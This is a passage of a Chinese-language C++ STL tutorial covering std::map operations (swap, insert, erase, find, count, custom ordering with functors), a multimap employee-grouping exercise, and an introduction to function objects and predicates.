class="comment">//交换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;m;</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;m2;</span><br><span class="line">	m<span class="number">2.</span><span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">4</span>, <span class="number">100</span>));</span><br><span class="line">	m<span class="number">2.</span><span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">5</span>, <span class="number">200</span>));</span><br><span class="line">	m<span class="number">2.</span><span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">6</span>, <span class="number">300</span>));</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换前&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line">	<span class="built_in">printMap</span>(m2);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换后&quot;</span> &lt;&lt; endl;</span><br><span class="line">	m.<span class="built_in">swap</span>(m2);</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line">	<span class="built_in">printMap</span>(m2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>统计大小   — size</li>
<li>判断是否为空   — empty</li>
<li>交换容器   — swap</li>
</ul>
<h4 id="3-9-4-map插入和删除"><a href="#3-9-4-map插入和删除" class="headerlink" title="3.9.4 map插入和删除"></a>3.9.4 map插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>map容器进行插入数据和删除数据</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>insert(elem);</code>           &#x2F;&#x2F;在容器中插入元素。</li>
<li><code>clear();</code>                    &#x2F;&#x2F;清除所有元素</li>
<li><code>erase(pos);</code>              &#x2F;&#x2F;删除pos迭代器所指的元素，返回下一个元素的迭代器。</li>
<li><code>erase(beg, end);</code>    &#x2F;&#x2F;删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。</li>
<li><code>erase(key);</code>            &#x2F;&#x2F;删除容器中值为key的元素。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printMap</span><span class="params">(map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&amp;m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::iterator it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;key = &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; value = &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//插入</span></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; m;</span><br><span class="line">	<span class="comment">//第一种插入方式</span></span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	<span class="comment">//第二种插入方式</span></span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	<span class="comment">//第三种插入方式</span></span><br><span class="line">	m.<span class="built_in">insert</span>(map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::<span class="built_in">value_type</span>(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line">	<span class="comment">//第四种插入方式</span></span><br><span class="line">	m[<span class="number">4</span>] = <span class="number">40</span>; </span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除</span></span><br><span class="line">	m.<span class="built_in">erase</span>(m.<span class="built_in">begin</span>());</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line"></span><br><span class="line">	m.<span class="built_in">erase</span>(<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//清空</span></span><br><span class="line">	m.<span class="built_in">erase</span>(m.<span class="built_in">begin</span>(),m.<span class="built_in">end</span>());</span><br><span class="line">	m.<span class="built_in">clear</span>();</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>map插入方式很多，记住其一即可</li>
</ul>
<ul>
<li>插入   — insert </li>
<li>删除   — erase</li>
<li>清空   — clear</li>
</ul>
<h4 id="3-9-5-map查找和统计"><a href="#3-9-5-map查找和统计" class="headerlink" title="3.9.5 map查找和统计"></a>3.9.5 map查找和统计</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对map容器进行查找数据以及统计数据</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>find(key);</code>                  &#x2F;&#x2F;查找key是否存在,若存在，返回该键的元素的迭代器；若不存在，返回set.end();</li>
<li><code>count(key);</code>                &#x2F;&#x2F;统计key的元素个数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查找和统计</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;m; </span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//查找</span></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::iterator pos = m.<span class="built_in">find</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pos != m.<span class="built_in">end</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到了元素 key = &quot;</span> &lt;&lt; (*pos).first &lt;&lt; <span class="string">&quot; value = &quot;</span> &lt;&lt; (*pos).second &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未找到元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//统计</span></span><br><span class="line">	<span class="type">int</span> num = m.<span class="built_in">count</span>(<span class="number">3</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num = &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>查找   —  find    （返回的是迭代器）</li>
<li>统计   —  count  （对于map，结果为0或者1）</li>
</ul>
<h4 id="3-9-6-map容器排序"><a href="#3-9-6-map容器排序" class="headerlink" title="3.9.6 map容器排序"></a>3.9.6 map容器排序</h4><p><strong>学习目标：</strong></p>
<ul>
<li>map容器默认排序规则为 按照key值进行 从小到大排序，掌握如何改变排序规则</li>
</ul>
<p><strong>主要技术点:</strong></p>
<ul>
<li>利用仿函数，可以改变排序规则</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 &gt; v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//默认从小到大排序</span></span><br><span class="line">	<span class="comment">//利用仿函数实现从大到小排序</span></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>, MyCompare&gt; m;</span><br><span class="line"></span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">4</span>, <span class="number">40</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="number">5</span>, <span class="number">50</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (map&lt;<span class="type">int</span>, <span class="type">int</span>, MyCompare&gt;::iterator it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;key:&quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; value:&quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>利用仿函数可以指定map容器的排序规则</li>
<li>对于自定义数据类型，map必须要指定排序规则,同set容器</li>
</ul>
<h3 id="3-10-案例-员工分组"><a href="#3-10-案例-员工分组" class="headerlink" title="3.10 案例-员工分组"></a>3.10 案例-员工分组</h3><h4 id="3-10-1-案例描述"><a href="#3-10-1-案例描述" class="headerlink" title="3.10.1 案例描述"></a>3.10.1 案例描述</h4><ul>
<li>公司今天招聘了10个员工（ABCDEFGHIJ），10名员工进入公司之后，需要指派员工在那个部门工作</li>
<li>员工信息有: 姓名  工资组成；部门分为：策划、美术、研发</li>
<li>随机给10名员工分配部门和工资</li>
<li>通过multimap进行信息的插入  key(部门编号) value(员工)</li>
<li>分部门显示员工信息</li>
</ul>
<h4 id="3-10-2-实现步骤"><a href="#3-10-2-实现步骤" class="headerlink" title="3.10.2 实现步骤"></a>3.10.2 实现步骤</h4><ol>
<li>创建10名员工，放到vector中</li>
<li>遍历vector容器，取出每个员工，进行随机分组</li>
<li>分组后，将员工部门编号作为key，具体员工作为value，放入到multimap容器中</li>
<li>分部门显示员工信息</li>
</ol>
<p><strong>案例代码：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">- 公司今天招聘了10个员工（ABCDEFGHIJ），10名员工进入公司之后，需要指派员工在那个部门工作</span></span><br><span class="line"><span class="comment">- 员工信息有: 姓名  工资组成；部门分为：策划、美术、研发</span></span><br><span class="line"><span class="comment">- 随机给10名员工分配部门和工资</span></span><br><span class="line"><span class="comment">- 通过multimap进行信息的插入  key(部门编号) value(员工)</span></span><br><span class="line"><span class="comment">- 分部门显示员工信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CEHUA  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEISHU 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YANFA  2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Worker</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Salary;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">createWorker</span><span class="params">(vector&lt;Worker&gt;&amp;v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string nameSeed = <span class="string">&quot;ABCDEFGHIJ&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		Worker worker;</span><br><span class="line">		worker.m_Name = <span class="string">&quot;员工&quot;</span>;</span><br><span class="line">		worker.m_Name += nameSeed[i];</span><br><span class="line"></span><br><span class="line">		worker.m_Salary = <span class="built_in">rand</span>() % <span class="number">10000</span> + <span class="number">10000</span>; <span class="comment">// 10000 ~ 19999</span></span><br><span class="line">		<span class="comment">//将员工放入到容器中</span></span><br><span class="line">		v.<span class="built_in">push_back</span>(worker);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//员工分组</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setGroup</span><span class="params">(vector&lt;Worker&gt;&amp;v,multimap&lt;<span class="type">int</span>,Worker&gt;&amp;m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (vector&lt;Worker&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//产生随机部门编号</span></span><br><span class="line">		<span class="type">int</span> deptId = <span class="built_in">rand</span>() % <span class="number">3</span>; <span class="comment">// 0 1 2 </span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//将员工插入到分组中</span></span><br><span class="line">		<span class="comment">//key部门编号，value具体员工</span></span><br><span class="line">		m.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(deptId, *it));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showWorkerByGourp</span><span class="params">(multimap&lt;<span class="type">int</span>,Worker&gt;&amp;m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 0  A  B  C   1  D  E   2  F G ...</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;策划部门：&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	multimap&lt;<span class="type">int</span>,Worker&gt;::iterator pos = m.<span class="built_in">find</span>(CEHUA);</span><br><span class="line">	<span class="type">int</span> count = m.<span class="built_in">count</span>(CEHUA); <span class="comment">// 统计具体人数</span></span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; pos != m.<span class="built_in">end</span>() &amp;&amp; index &lt; count; pos++ , index++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; pos-&gt;second.m_Name &lt;&lt; <span class="string">&quot; 工资： &quot;</span> &lt;&lt; pos-&gt;second.m_Salary &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;美术部门： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	pos = m.<span class="built_in">find</span>(MEISHU);</span><br><span class="line">	count = m.<span class="built_in">count</span>(MEISHU); <span class="comment">// 统计具体人数</span></span><br><span class="line">	index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; pos != m.<span class="built_in">end</span>() &amp;&amp; index &lt; count; pos++, index++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; pos-&gt;second.m_Name &lt;&lt; <span class="string">&quot; 工资： &quot;</span> &lt;&lt; pos-&gt;second.m_Salary &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;研发部门： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	pos = m.<span class="built_in">find</span>(YANFA);</span><br><span class="line">	count = m.<span class="built_in">count</span>(YANFA); <span class="comment">// 统计具体人数</span></span><br><span class="line">	index = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (; pos != m.<span class="built_in">end</span>() &amp;&amp; index &lt; count; pos++, index++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; pos-&gt;second.m_Name &lt;&lt; <span class="string">&quot; 工资： &quot;</span> &lt;&lt; pos-&gt;second.m_Salary &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//1、创建员工</span></span><br><span class="line">	vector&lt;Worker&gt;vWorker;</span><br><span class="line">	<span class="built_in">createWorker</span>(vWorker);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、员工分组</span></span><br><span class="line">	multimap&lt;<span class="type">int</span>, Worker&gt;mWorker;</span><br><span class="line">	<span class="built_in">setGroup</span>(vWorker, mWorker);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//3、分组显示员工</span></span><br><span class="line">	<span class="built_in">showWorkerByGourp</span>(mWorker);</span><br><span class="line"></span><br><span class="line">	<span class="comment">////测试</span></span><br><span class="line">	<span class="comment">//for (vector&lt;Worker&gt;::iterator it = vWorker.begin(); it != vWorker.end(); it++)</span></span><br><span class="line">	<span class="comment">//&#123;</span></span><br><span class="line">	<span class="comment">//	cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; it-&gt;m_Name &lt;&lt; &quot; 工资： &quot; &lt;&lt; it-&gt;m_Salary &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>当数据以键值对形式存在，可以考虑用map 或 multimap</li>
</ul>
<h2 id="4-STL-函数对象"><a href="#4-STL-函数对象" class="headerlink" title="4 STL- 函数对象"></a>4 STL- 函数对象</h2><h3 id="4-1-函数对象"><a href="#4-1-函数对象" class="headerlink" title="4.1 函数对象"></a>4.1 函数对象</h3><h4 id="4-1-1-函数对象概念"><a href="#4-1-1-函数对象概念" class="headerlink" title="4.1.1 函数对象概念"></a>4.1.1 函数对象概念</h4><p><strong>概念：</strong></p>
<ul>
<li>重载<strong>函数调用操作符</strong>的类，其对象常称为<strong>函数对象</strong></li>
<li><strong>函数对象</strong>使用重载的()时，行为类似函数调用，也叫<strong>仿函数</strong></li>
</ul>
<p><strong>本质：</strong></p>
<p>函数对象(仿函数)是一个<strong>类</strong>，不是一个函数</p>
<h4 id="4-1-2-函数对象使用"><a href="#4-1-2-函数对象使用" class="headerlink" title="4.1.2  函数对象使用"></a>4.1.2  函数对象使用</h4><p><strong>特点：</strong></p>
<ul>
<li>函数对象在使用时，可以像普通函数那样调用, 可以有参数，可以有返回值</li>
<li>函数对象超出普通函数的概念，函数对象可以有自己的状态</li>
<li>函数对象可以作为参数传递</li>
</ul>
<p><strong>示例:</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1、函数对象在使用时，可以像普通函数那样调用, 可以有参数，可以有返回值</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdd</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1,<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 + v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyAdd myAdd;</span><br><span class="line">	cout &lt;&lt; <span class="built_in">myAdd</span>(<span class="number">10</span>, <span class="number">10</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、函数对象可以有自己的状态</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyPrint</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		count = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(string test)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; test &lt;&lt; endl;</span><br><span class="line">		count++; <span class="comment">//统计使用次数</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> count; <span class="comment">//内部自己的状态</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyPrint myPrint;</span><br><span class="line">	<span class="built_in">myPrint</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">	<span class="built_in">myPrint</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">	<span class="built_in">myPrint</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;myPrint调用次数为： &quot;</span> &lt;&lt; myPrint.count &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3、函数对象可以作为参数传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doPrint</span><span class="params">(MyPrint &amp;mp , string test)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">mp</span>(test);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyPrint myPrint;</span><br><span class="line">	<span class="built_in">doPrint</span>(myPrint, <span class="string">&quot;Hello C++&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line">	<span class="built_in">test03</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>仿函数写法非常灵活，可以作为参数进行传递。</li>
</ul>
<h3 id="4-2-谓词"><a href="#4-2-谓词" class="headerlink" title="4.2  谓词"></a>4.2  谓词</h3><h4 id="4-2-1-谓词概念"><a href="#4-2-1-谓词概念" class="headerlink" title="4.2.1 谓词概念"></a>4.2.1 谓词概念</h4><p><strong>概念：</strong></p>
<ul>
<li>返回bool类型的仿函数称为<strong>谓词</strong></li>
<li>如果operator()接受一个参数，那么叫做一元谓词</li>
<li>如果operator()接受两个参数，那么叫做二元谓词</li>
</ul>
<h4 id="4-2-2-一元谓词"><a href="#4-2-2-一元谓词" class="headerlink" title="4.2.2 一元谓词"></a>4.2.2 一元谓词</h4><p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.一元谓词</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">GreaterFive</span>&#123;</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> val &gt; <span class="number">5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = 